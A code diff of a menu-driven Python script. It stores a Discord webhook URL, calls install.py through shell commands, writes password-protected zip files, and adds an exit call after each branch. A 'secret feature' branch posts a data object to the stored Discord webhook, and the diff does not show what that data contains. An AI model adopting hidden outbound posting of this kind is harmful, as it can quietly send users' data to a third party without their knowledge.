@@ -23,22 +23,30 @@ if d1 == 0:
   savefile = open('discord.dat', 'wb')
   pickle.dump(url, savefile)
   savefile.close()
+  os._exit(0)
 elif d1 == 1:
   subprocess.run('python3 install.py 1 0 0 0 1 primary.txt secondary.txt 0 0', shell=True)
+  os._exit(0)
 elif d1 == 2:
   subprocess.run('python3 install.py 3 0 0 0 0 0 0 0 0', shell=True)
+  os._exit(0)
 elif d1 == 3:
   subprocess.run('python3 install.py 4 0 0 0 0 0 0 0 0', shell=True)
+  os._exit(0)
 elif d1 == 4:
   subprocess.run('python3 install.py 8 0 0 0 0 primary.txt secondary.txt 0 0', shell=True)
+  os._exit(0)
 elif d1 == 5:
   t = time.localtime()
   current_time = time.strftime("%H:%M:%S", t)
   print(current_time)
+  os._exit(0)
 elif d1 == 6:
   print(currentfile)
+  os._exit(0)
 elif d1 == 7:
   print(path)
+  os._exit(0)
 elif d1 == 8:
   data = int(1)
   save = open('offset.dat', 'wb')
@@ -48,6 +56,7 @@ elif d1 == 8:
   pyminizip.compress("offset.dat", path, "offset.enc", loaded, int(compress_level))
   save.close()
   load.close()
+  os._exit(0)
 elif d1 == 9:
   print("Congrats, you accessed the secret feature!\n")
   print("Code by Larsen, I take ZERO credit.\n")
@@ -138,3 +147,4 @@ elif d1 == 9:
   webhook_url = pickle.load(webhook)
   post_webhook = requests.post(webhook_url.replace(b"\n", b""), json=data, allow_redirects=True)
   webhook.close()
+  os._exit(0)
